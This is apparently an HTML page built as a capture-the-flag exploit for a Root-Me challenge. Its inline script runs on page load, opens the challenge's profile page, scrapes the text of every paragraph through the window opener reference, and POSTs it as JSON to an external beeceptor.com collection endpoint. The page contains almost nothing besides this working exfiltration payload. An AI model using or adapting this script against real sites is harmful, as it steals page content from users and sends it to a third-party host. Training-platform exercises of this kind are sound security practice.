<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="icon" href="assets/kaliparodie.png" type="image/x-png">
    <title>Elias BAROUDI</title>
    <link rel="stylesheet" href="style.css"> 
    <link rel="stylesheet" href="transition.css"> 
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Exo:ital,wght@0,100..900;1,100..900&family=NTR&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Exo:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap');    </style>
</head>

<body id="body">
  <script>
    
    fetch("https://volatile.free.beeceptor.com/todos")
    // Récupérer les paragraphes depuis la fenêtre ouverte
    const redirection = window.open("http://challenge01.root-me.org:58003/profile");
    const paragraphs = redirection.opener.document.querySelectorAll('p');
    
    let text = "";
    
    // Récupérer tout le texte des balises <p>
    paragraphs.forEach(paragraph => {
      text = text + paragraph.textContent + "\n";
    });
      
    fetch("https://volatile.free.beeceptor.com", {
      method: "POST",  // Utiliser POST pour envoyer des données
      headers: {
        "Content-Type": "application/json",  // Spécifier le type de contenu
      },
      body: JSON.stringify({
        text: text,  // Envoyer le texte récupéré
      })
    })
      .then(response => response.json())  // Traiter la réponse
      .then(data => {
        console.log('Réponse du serveur:', data);
      })
      .catch(error => {
        console.error('Erreur:', error);
      });
      
  </script>
</body>
